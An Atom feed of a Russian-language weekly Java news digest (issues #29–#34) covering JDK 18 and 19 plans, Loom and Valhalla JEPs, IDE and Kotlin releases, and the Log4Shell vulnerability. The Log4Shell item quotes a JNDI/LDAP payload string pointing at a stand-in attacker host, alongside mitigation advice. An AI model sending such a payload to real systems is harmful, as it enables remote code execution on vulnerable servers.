<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>miniJUG</title>
  <link rel="alternate" type="text/html" href="https://minijug.ru" />
  <subtitle type="text">Новости Java</subtitle>
  <id>https://minijug.ru/feed.xml</id>
  <updated>2021-12-12T17:00:00Z</updated>
  <entry>
    <title>Новости Java #34</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_34.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_34.html</id>
    <updated>2021-12-12T17:00:00Z</updated>
    <published>2021-12-12T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Java 18 перешла в &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-December/006287.html"&gt;первую фазу Rampdown&lt;/a&gt;: главный репозиторий JDK был ответвлён в &lt;a href="https://github.com/openjdk/jdk18"&gt;стабилизационный репозиторий JDK 18&lt;/a&gt;, и новых JEP'ов в этом релизе больше не будет.&lt;/p&gt;
&lt;p&gt;Одновременно с этим началась &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8273146"&gt;разработка Java 19&lt;/a&gt;. У нового релиза появилась &lt;a href="https://jdk.java.net/19/"&gt;своя страница&lt;/a&gt;, где уже доступна для скачивания первая ранняя сборка JDK 19-ea+1.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В популярной библиотеке логирования Apache Log4J 2.x обнаружили &lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;серьёзную уязвимость&lt;/a&gt;, позволяющую выполнить на уязвимом сервере произвольный код. Уязвимость может быть эксплуатирована, если Log4J используется для параметризированного логирования непроверенного текста, приходящего от пользователя, например:&lt;/p&gt;
&lt;pre&gt;log.info(&lt;span style="color: darkred"&gt;"Сообщение от пользователя: {}"&lt;/span&gt;, userMsg);&lt;/pre&gt;
&lt;p&gt;Злоумышленник может воспользоваться этим и послать строку специального вида (&lt;code&gt;${jndi:ldap://attacker.com/a}&lt;/code&gt;), которую обработает Log4J и загрузит через JNDI вредоносный класс с LDAP-сервера, контролируемого злоумышленником. Класс будет инъектирован в Java-процесс, что позволит атакующему выполнить произвольный код с правами пользователя, от лица которого запущен процесс.&lt;/p&gt;
&lt;p&gt;Так как Apache Log4J является одной из двух самых популярных библиотек логирования в Java (наряду с Logback), то такая уязвимость поставила под угрозу огромное количество сервисов по всему миру, включая крупнейших.&lt;/p&gt;
&lt;p&gt;Наиболее надёжным способом защиты от Log4Shell (такое народное название дали этой уязвимости) является обновление Log4J до версии &lt;a href="https://search.maven.org/artifact/org.apache.logging.log4j/log4j/2.15.0/pom"&gt;2.15.0&lt;/a&gt;. Также решением является установка системного свойства &lt;code&gt;log4j2.formatMsgNoLookups=true&lt;/code&gt;, однако оно работает только для версий Log4J &lt;code&gt;2.10.0&lt;/code&gt; и выше. Кроме того, можно полностью удалить class-файл &lt;code&gt;org/apache/logging/log4j/core/lookup/JndiLookup.class&lt;/code&gt; из библиотеки.&lt;/p&gt;
&lt;p&gt;Уязвимости меньше подвержены &lt;a href="https://gist.github.com/shipilev/cfbe09a31ac32f0cc51078db7898c797"&gt;новые версии Java&lt;/a&gt; (8u191+, 11.0.1+, 13, 15, 17), однако они не защищены от всех возможных векторов атаки, поэтому полагаться на такую защиту крайне нежелательно и настоятельно рекомендуется предпринять один из вышеописанных шагов.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://www.youtube.com/watch?v=3W9bvidcO20"&gt;Eclipse 2021-12&lt;/a&gt; со следующими нововведениями:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Поддержка разработки на Java 17&lt;/li&gt;
  &lt;li&gt;Новое действие "Convert String concatenation to Text Block"&lt;/li&gt;
  &lt;li&gt;Возможность помечать объекты меткой в режиме отладки&lt;/li&gt;
  &lt;li&gt;Умная вставка текста в поле диалога Open Type (обрезание лишнего)&lt;/li&gt;
  &lt;li&gt;Новый редактор POM с возможностью автодополнения по имени артефакта/плагина и выбором из выпадающего списка версий&lt;/li&gt;
  &lt;li&gt;Новое view "Launch Configurations"&lt;/li&gt;
  &lt;li&gt;Мультикурсоры (одновременное редактирование в нескольких частях файла)&lt;/li&gt;
  &lt;li&gt;Открывание ссылок во внешнем браузере вместо внутреннего&lt;/li&gt;
  &lt;li&gt;Улучшения в тёмной теме&lt;/li&gt;
  &lt;li&gt;Улучшение времени старта IDE&lt;/li&gt;
  &lt;li&gt;Улучшения в EGit и JS-редакторе&lt;/li&gt;
&lt;/ul&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #33</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_33.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_33.html</id>
    <updated>2021-12-05T17:00:00Z</updated>
    <published>2021-12-05T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Ещё один JEP предложен к Java 18: &lt;a href="https://openjdk.java.net/jeps/421"&gt;Deprecate Finalization for Removal (JEP 421)&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В проекте Valhalla появился новый черновик JEP: &lt;a href="http://openjdk.java.net/jeps/8277163"&gt;Value Objects (Preview)&lt;/a&gt;. В нём предлагается ввести новый тип объектов в Java: value-объекты.&lt;/p&gt;
&lt;p&gt;Value-объекты отличаются от классических объектов тем, что не имеют identity. Это позволяет улучшить производительность при использовании таких объектов и уменьшить занимаемое ими место в памяти. Также value-объекты являются полностью иммутабельными, всегда являются &lt;code&gt;final&lt;/code&gt; и не могут иметь &lt;code&gt;synchronized&lt;/code&gt;-методов.&lt;/p&gt;
&lt;p&gt;Однако, в отличие от примитивных объектов (&lt;a href="https://openjdk.java.net/jeps/401"&gt;JEP 401&lt;/a&gt;), которые также имеют все вышеописанные свойства, value-объекты являются ссылочными, поэтому являются nullable.&lt;/p&gt;
&lt;p&gt;Таким образом, если в Valhalla всё будет реализовано согласно такой модели, то в Java будет три типа объектов: identity-объекты, value-объекты и примитивные объекты.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://blog.jetbrains.com/idea/2021/11/intellij-idea-2021-3/"&gt;IntelliJ IDEA 2021.3&lt;/a&gt;. Перечислим некоторые заметные изменения и улучшения:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;В Ultimate версии появилась возможность &lt;a href="https://blog.jetbrains.com/blog/2021/11/29/introducing-remote-development-for-jetbrains-ides/"&gt;удалённой разработки&lt;/a&gt;. Развернув бэкенд IDEA на удалённом сервере, к нему можно подключиться и работать из любой точки мира. Функция пока работает в Beta-режиме.&lt;/li&gt;
  &lt;li&gt;Новая функция &lt;i&gt;Repair IDE&lt;/i&gt; позволяет быстро диагностировать и устранять наиболее распространённые неполадки.&lt;/li&gt;
  &lt;li&gt;Возможность изменить шрифт во всех вкладках одновременно с помощью &lt;code&gt;Ctrl&lt;/code&gt; и колеса мыши.&lt;/li&gt;
  &lt;li&gt;Улучшенный предпросмотр результатов &lt;a href="https://www.jetbrains.com/help/idea/intention-actions.html"&gt;intention-действий&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Возможность разделения окна &lt;i&gt;Run&lt;/i&gt; на несколько вкладок.&lt;/li&gt;
  &lt;li&gt;Поиск действий в &lt;i&gt;Search Everywhere&lt;/i&gt; теперь тоже использует машинное обучение (ранее в IDEA 2020.3 машинное обучение было введено для Code Completion).&lt;/li&gt;
  &lt;li&gt;Новые инспекции в Java: отслеживание небезопасных строк (SQL-инъекция, XSS, конфиденциальные данные и т.п.), замена &lt;code&gt;collect(toList())&lt;/code&gt; на &lt;code&gt;toList()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;При выполнении рефакторинга &lt;i&gt;Introduct Local Variable&lt;/i&gt; теперь не всплывает окно с настройками, а появляется значок шестерёнки. А при выполнении рефакторинга &lt;i&gt;Introduct Parameter&lt;/i&gt; среда теперь спрашивает, где нужно заменить вхождения, и тоже показывает значок шестерёнки.&lt;/li&gt;
  &lt;li&gt;В &lt;i&gt;Run/Debug Configurations&lt;/i&gt; теперь можно настраивать classpath, вручную добавляя туда отдельные записи или исключая ненужные.&lt;/li&gt;
  &lt;li&gt;Множество новых улучшений в Kotlin: действие &lt;i&gt;Smart Step Into&lt;/i&gt; в отладчике, &lt;code&gt;inline&lt;/code&gt;-функции в стек-трейсе, рефакторинг &lt;i&gt;Extract Constant&lt;/i&gt;, улучшенная инспекция &lt;i&gt;Possibly blocking call in non-blocking context&lt;/i&gt;, подсказки для диапазонов, улучшенный мастер создания проектов.&lt;/li&gt;
  &lt;li&gt;Async Profiler 2.0 теперь доступен в Windows-версии IntelliJ IDEA Ultimate из коробки.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Компания JetBrains анонсировала свою новую среду разработки &lt;a href="https://blog.jetbrains.com/ru/blog/2021/11/29/welcome-to-fleet/"&gt;Fleet&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Fleet &amp;ndash; это созданная с нуля среда разработки, которая представляет собой легковесный редактор с базовыми возможностями, но с возможностью включения smart-режима, при котором она превращается в полнофункциональную IDE. В отличие от классических IDE JetBrains, каждая из которых создана для одной конкретной технологии, Fleet поддерживает разные технологии в рамках одного приложения (на текущий момент есть поддержка Java, Kotlin, Python, Go, JavaScript, Rust, TypeScript, JSON). Fleet имеет &lt;a href="https://www.jetbrains.com/help/fleet/1.0/architecture-overview.html"&gt;распределённую архитектуру&lt;/a&gt;, в которой фронтенд отделён от бэкенда, что позволяет использовать среду не только локально, но и в распределённых сценариях: удалённая, облачная, совместая разработка и т.д.&lt;/p&gt;
&lt;p&gt;В данный момент Fleet недоступен широкому кругу пользователей, и работает программа Fleet Preview, в которой, однако, &lt;a href="https://twitter.com/JetBrains_Fleet/status/1466705214761840643"&gt;закончился приём заявок &lt;/a&gt; из-за большого наплыва желающих протестировать новую IDE.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел выпуск &lt;a href="https://blog.jetbrains.com/idea/2021/12/java-annotated-monthly-december-2021/"&gt;Java Annotated Monthly&lt;/a&gt; от JetBrains за декабрь 2021.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://maven.apache.org/docs/3.8.4/release-notes.html"&gt;Apache Maven 3.8.4&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="http://www.h2database.com/html/changelog.html"&gt;вторая версия&lt;/a&gt; H2, популярной SQL СУБД, написанной полностью на Java. Это произошло спустя 16 лет после выхода первой версии.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://mail.openjdk.java.net/pipermail/jcstress-dev/2021-December/000965.html"&gt;JCStress 0.15&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #32</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_32.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_32.html</id>
    <updated>2021-11-21T17:00:00Z</updated>
    <published>2021-11-21T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышел &lt;a href="https://blog.jetbrains.com/kotlin/2021/11/kotlin-1-6-0-is-released/"&gt;Kotlin 1.6&lt;/a&gt;. Перечислим самые заметные изменения и улучшения:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Проверка исчерпываемости в &lt;code&gt;when&lt;/code&gt;-стейтментах: если &lt;code&gt;when&lt;/code&gt; не покрывает все возможные ветки (например, все подклассы sealed-класса), то компилятор выдаёт предупреждение. В Kotlin 1.7 такие предупреждения станут ошибкой.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;suspend&lt;/code&gt; функциональные типы теперь могут быть суперинтерфейсами (т.е. можно писать, например, &lt;code&gt;class MyClickAction : suspend () -&gt; Unit)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Автоматические конверсии из обычных функциональных типов к соответствующим &lt;code&gt;suspend&lt;/code&gt; функциональным типам.&lt;/li&gt;
  &lt;li&gt;Улучшенный вывод типов для рекурсивных generic типов.&lt;/li&gt;
  &lt;li&gt;Возможность разработки, используя три предыдущих версии API (т.е. 1.3, 1.4 и 1.5 для 1.6). Раньше поддерживалось только две предыдущих версии API.&lt;/li&gt;
  &lt;li&gt;Поддержка повторяющихся аннотаций с удержанием в рантайме.
  &lt;li&gt;Появились две новые функции: &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.io/readln.html"&gt;&lt;code&gt;readln()&lt;/code&gt;&lt;/a&gt;, которая возвращает non-nullable String, и &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.io/readln-or-null.html"&gt;&lt;code&gt;readlnOrNull()&lt;/code&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;API стали стабильными: &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.reflect/type-of.html"&gt;&lt;code&gt;typeOf()&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.time/-duration/"&gt;&lt;code&gt;Duration&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.time/-duration-unit/"&gt;&lt;code&gt;DurationUnit&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.collections/build-list.html"&gt;билдеры коллекций&lt;/a&gt;, &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.text/split-to-sequence.html"&gt;&lt;code&gt;splitToSequence()&lt;/code&gt;&lt;/a&gt; с Regex, операции &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin/rotate-right.html"&gt;битового поворота&lt;/a&gt; чисел.&lt;/li&gt;
  &lt;li&gt;Функцию &lt;code&gt;compareTo()&lt;/code&gt; теперь можно вызывать через инфиксную нотацию (&lt;code&gt;x compareTo y&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Очередных два JEP'а предложены к JDK 18. Это &lt;a href="https://openjdk.java.net/jeps/419"&gt;JEP 419: Foreign Function &amp; Memory API (Second Incubator)&lt;/a&gt; и &lt;a href="https://openjdk.java.net/jeps/420"&gt;JEP 420: Pattern Matching for switch (Second Preview)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Также появился новый &lt;a href="https://openjdk.java.net/jeps/422"&gt;JEP 422: Linux/RISC-V Port&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В &lt;a href="https://wiki.openjdk.java.net/display/loom/Main"&gt;проекте Loom&lt;/a&gt; появились первые два черновика JEP.&lt;/p&gt;
&lt;p&gt;Первый &amp;ndash; &lt;a href="http://openjdk.java.net/jeps/8277129"&gt;Structured Concurrency (Preview)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;В этом JEP'е предлагается добавить в Java новое API для структурного concurrency. Структурное concurrency &amp;ndash; это concurrency, которое заимствует принципы обычного (последовательного) структурного программирования и гарантирует следующее: когда поток выполнения разделяется на несколько потоков выполнения, то эти потоки воссоединяются в том же блоке кода. Все эти потоки логически сгруппированы и организованы в иерархию.&lt;/p&gt;
&lt;p&gt;Рассмотрим простой пример кода, выполняющийся последовательно:&lt;/p&gt;
&lt;pre&gt;String foo() &lt;span style="color: blue"&gt;throws&lt;/span&gt; IOException, InterruptedException {
    &lt;span style="color: blue"&gt;int&lt;/span&gt; bar = bar(); &lt;span style="color: green"&gt;// throws IOException, InterruptedException&lt;/span&gt;
    String baz = baz(); &lt;span style="color: green"&gt;// то же самое&lt;/span&gt;
    &lt;span style="color: blue"&gt;return&lt;/span&gt; baz + bar;
}&lt;/pre&gt;
&lt;p&gt;В этом коде нет ничего сверхестественного, и он чрезвычайно прост и надёжен. Но если необходимо выполнить операции &lt;code&gt;bar()&lt;/code&gt; и &lt;code&gt;baz()&lt;/code&gt; параллельно, то трансформировать этот код с сохранением всех структурных гарантий, используя существующие средства Java, будет не так уж и просто.&lt;/p&gt;
&lt;p&gt;Новый предложенный класс &lt;code&gt;StructuredExecutor&lt;/code&gt; призван, чтобы решить эту проблему. С его использованием аналогичный распараллеленный код будет выглядеть следующим образом:&lt;/p&gt;
&lt;pre&gt;String foo() &lt;span style="color: blue"&gt;throws&lt;/span&gt; IOException, InterruptedException {
    &lt;span style="color: blue"&gt;try&lt;/span&gt; (&lt;span style="color: blue"&gt;var&lt;/span&gt; s = StructuredExecutor.open()) {
        &lt;span style="color: blue"&gt;var&lt;/span&gt; handler = &lt;span style="color: blue"&gt;new&lt;/span&gt; StructuredExecutor.ShutdownOnFailure();
        Future&amp;lt;Integer&amp;gt; bar = s.fork(() -&gt; bar(), handler);
        Future&amp;lt;String&amp;gt; baz = s.fork(() -&gt; baz(), handler);

        s.join();
        handler.throwIfFailed();

        &lt;span style="color: blue"&gt;return&lt;/span&gt; baz.resultNow() + bar.resultNow();
    } &lt;span style="color: blue"&gt;catch&lt;/span&gt; (ExecutionException e) {
        &lt;span style="color: blue"&gt;if&lt;/span&gt; (e.getCause() &lt;span style="color: blue"&gt;instanceof&lt;/span&gt; IOException ioe) throw ioe;
        &lt;span style="color: blue"&gt;throw new&lt;/span&gt; RuntimeException(e);
   }
}&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;StructuredExecutor&lt;/code&gt; в данном случае обеспечивает множество гарантий. Например, если одна из операций &lt;code&gt;bar()&lt;/code&gt; и &lt;code&gt;baz()&lt;/code&gt; завершается ошибкой, то другая операция отменяется автоматически (если ещё не завершена). Или если операция &lt;code&gt;foo()&lt;/code&gt; прерывается в процессе ожидания &lt;code&gt;join()&lt;/code&gt;, то обе операции &lt;code&gt;bar()&lt;/code&gt; и &lt;code&gt;baz()&lt;/code&gt; отменяются. Всех этих гарантий не было бы, если бы использовались существующие реализации &lt;code&gt;ExecutorService&lt;/code&gt;. Чтобы эти гарантии обеспечить, пришлось бы для этого написать большое количество дополнительного кода.&lt;/p&gt;
&lt;p&gt;Таким образом, новое API значительно облегчит написание чистого и корректного конкурентного кода с использованием структурного подхода.&lt;/p&gt;

&lt;p class="pt-2"&gt;Второй JEP &amp;ndash; это &lt;a href="http://openjdk.java.net/jeps/8277131"&gt;Virtual Threads (Preview)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Виртуальные нити &amp;ndash; это новый вид нитей (т.е. новый подкласс &lt;code&gt;java.lang.Thread&lt;/code&gt;), которые, в отличие от нитей операционной системы, могут хорошо масштабироваться до миллионов экземпляров. При этом поведение таких нитей практически не отличается от обычных, а значит существующий конкурентный код можно будет смигрировать на виртуальные нити, не затрачивая больших усилий. Виртуальные нити являются пользовательской надстройкой и работают поверх нитей операционной системы, поэтому существуют только для JVM, но не для OS.&lt;/p&gt;
&lt;p&gt;Отличительной особенностью виртуальных нитей является то, что при блокирующем вызове они приостанавливаются, позволяя нити-носителю продолжить выполнять другие задачи. Когда блокирующая операция завершается, виртуальная нить помещается в очередь планировщика и её выполнение возобновляется на той же или уже совсем другой нити-носителе.&lt;/p&gt;
&lt;p&gt;Вместе с виртуальным нитями также вводится большое количество нового API:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;Thread.Builder&lt;/code&gt; &amp;ndash; билдер нитей. Например, виртуальную нить можно создать путём вызова &lt;code&gt;Thread.ofVirtual().name("name").unstarted(runnable)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Thread.startVirtualThread(Runnable)&lt;/code&gt; &amp;ndash; удобный метод, позволяющий создать и сразу же запустить виртуальную нить.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Thread.isVirtual()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Thread.join(Duration)&lt;/code&gt; и &lt;code&gt;Thread.sleep(Duration)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Executors.newVirtualThreadExecutor()&lt;/code&gt; и &lt;code&gt;Executors.newThreadPerTaskExecutor()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Future.join()&lt;/code&gt;, &lt;code&gt;Future.state()&lt;/code&gt; и &lt;code&gt;Future.isCompletedNormally()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;ExecutorService&lt;/code&gt; теперь является AutoCloseable.&lt;/li&gt;
  &lt;li&gt;И другие.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Для виртуальных нитей также добавляется поддержка в дебаггере, JVM TI и Java Flight Recorder.&lt;/p&gt;
&lt;p&gt;В целом виртуальные нити должны значительно облегчить написание конкурентных программ, избавя от необходимости прибегать к асинхронным API во многих случаях.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://spring.io/blog/2021/11/19/spring-boot-2-6-is-now-available"&gt;Spring Boot 2.6&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #31</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_31.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_31.html</id>
    <updated>2021-11-14T17:00:00Z</updated>
    <published>2021-11-14T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Появилось &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-November/006199.html"&gt;расписание выхода JDK 18&lt;/a&gt;. По плану общедоступная версия Java 18 должна выйти 22 марта 2022 года.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел новый &lt;a href="http://openjdk.java.net/jeps/421"&gt;JEP 421: Deprecate Finalization for Removal&lt;/a&gt;. В нём предлагается пометить все методы, относящиеся к финализации, как deprecated for removal, а также добавить опцию командной строки, позволяющую отключить финализацию во время выполнения. Кроме того, в будущих версиях JDK предлагается отключить финализацию по умолчанию с возможностью включения, затем отключить полностью, а потом удалить, наконец, весь API финализации.&lt;/p&gt;
&lt;p&gt;Финализация &amp;ndash; это механизм, который присутствовал в Java с момента её появления. Со временем стало понятно, что у &lt;code&gt;finalize()&lt;/code&gt; есть серьёзные недостатки: проблемы безопасности (возможность утечки и возрождения финализируемого объекта, возможность &amp;laquo;сломать&amp;raquo; объект и привести его в неконсистентное состояние), проблемы производительности (замедление работы сборщика мусора, увеличение потребляемой памяти из-за дополнительных объектов и вспомогательных структур данных GC), отсутствие гибкости (невозможность отмены финализации, отсутствие контроля потоков, которые будут вызывать финализацию), сложная программная модель (риск забыть вызвать &lt;code&gt;super.finalize()&lt;/code&gt; в подклассе) и т.д. Это привело к тому, что в Java 9 метод &lt;a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Object.html#finalize--"&gt;Object.finalize()&lt;/a&gt; стал помечен как deprecated. Теперь настало время идти дальше в сторону полного отказа от финализации.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В Java 18 был интегрирован &lt;a href="https://openjdk.java.net/jeps/418"&gt;JEP 418: Internet-Address Resolution SPI&lt;/a&gt;. Про него мы писали в &lt;a href="java_news_24.html"&gt;выпуске #24&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Появилось два новых черновика JEP: &lt;a href="http://openjdk.java.net/jeps/8276094"&gt;Region Pinning in G1&lt;/a&gt; и &lt;a href="http://openjdk.java.net/jeps/8276797"&gt;Linux/RISC-V Port&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; JUG.ru выложил &lt;a href="https://www.youtube.com/playlist?list=PLVe-2wcL84b-weU5FB9NslU-dmOJnsLW2"&gt;видео с JPoint 2021&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; JetBrains выпустил &lt;a href="https://blog.jetbrains.com/idea/2021/11/java-annotated-monthly-november-2021/"&gt;Java Annotated Monthly за ноябрь 2021&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://docs.gradle.org/7.3/release-notes.html"&gt;Gradle 7.3&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://github.com/amaembo/streamex/releases/tag/streamex-0.8.0"&gt;StreamEx 0.8.0&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #30</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_30.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_30.html</id>
    <updated>2021-10-24T17:00:00Z</updated>
    <published>2021-10-24T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышли обновления JDK:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/javase/17-0-1-relnotes.html"&gt;JDK 17.0.1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.java.net/pipermail/jdk-updates-dev/2021-October/009375.html"&gt;JDK 15.0.5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.java.net/pipermail/jdk-updates-dev/2021-October/009376.html"&gt;JDK 13.0.9&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.java.net/pipermail/jdk-updates-dev/2021-October/009368.html"&gt;JDK 11.0.13&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.java.net/pipermail/jdk8u-dev/2021-October/014373.html"&gt;JDK 8u312&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://jdk.java.net/18/"&gt;JDK 18-ea+20&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Новости JEP'ов:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://openjdk.java.net/jeps/416"&gt;JEP 416: Reimplement Core Reflection with Method Handles&lt;/a&gt; предложен к &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-October/006163.html"&gt;JDK 18&lt;/a&gt;. Про этот JEP мы писали в &lt;a href="java_news_18.html"&gt;выпуске 18&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://openjdk.java.net/jeps/420"&gt;JEP 420: Pattern Matching for switch (Second Preview)&lt;/a&gt; стал кандидатом (был черновиком).&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышли новые версии Spring:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://spring.io/blog/2021/10/14/spring-framework-5-3-11-and-5-2-18-available-now"&gt;Spring Framework 5.3.11 и 5.2.18&lt;/a&gt; (сразу после 5.3.11 вышел &lt;a href="https://spring.io/blog/2021/10/21/spring-framework-5-3-12-available-now"&gt;5.3.12&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://spring.io/blog/2021/10/18/spring-data-2021-0-6-and-2020-0-14-released"&gt;Spring Data 2021.0.6 и 2020.0.14&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Spring Boot &lt;a href="https://spring.io/blog/2021/10/21/spring-boot-2-5-6-is-now-available"&gt;2.5.6&lt;/a&gt; и &lt;a href="https://spring.io/blog/2021/10/21/spring-boot-2-4-12-is-now-available"&gt;2.4.12&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #29</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_29.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_29.html</id>
    <updated>2021-10-17T17:00:00Z</updated>
    <published>2021-10-17T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Очередной JEP &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-October/006157.html"&gt;запланирован&lt;/a&gt; в Java 18: &lt;a href="https://openjdk.java.net/jeps/408"&gt;Simple Web Server (JEP 408)&lt;/a&gt;. Про него мы писали в &lt;a href="java_news_13.html"&gt;выпуске 13&lt;/a&gt;.&lt;/p&gt;
&lt;p class="pt-2"&gt;&amp;bull; Появился новый черновик JEP: &lt;a href="http://openjdk.java.net/jeps/8273326"&gt;Pattern Matching for &lt;code&gt;switch&lt;/code&gt; (Second Preview)&lt;/a&gt;. В рассылке начато &lt;a href="https://mail.openjdk.java.net/pipermail/amber-dev/2021-September/007090.html"&gt;обсуждение&lt;/a&gt; того, что можно улучшить в паттерн-матчинге в следующей версии Java. Перечислим некоторые идеи, которые обсуждаются.&lt;/p&gt;

&lt;p class="pt-1"&gt;Улучшенная проверка тотальности для дженериков. К примеру, есть иерархия:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;class&lt;/span&gt; A&amp;lt;T&amp;gt; &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;class&lt;/span&gt; B&amp;lt;T&amp;gt; &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;class&lt;/span&gt; C &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;String&amp;gt; { }&lt;/pre&gt;
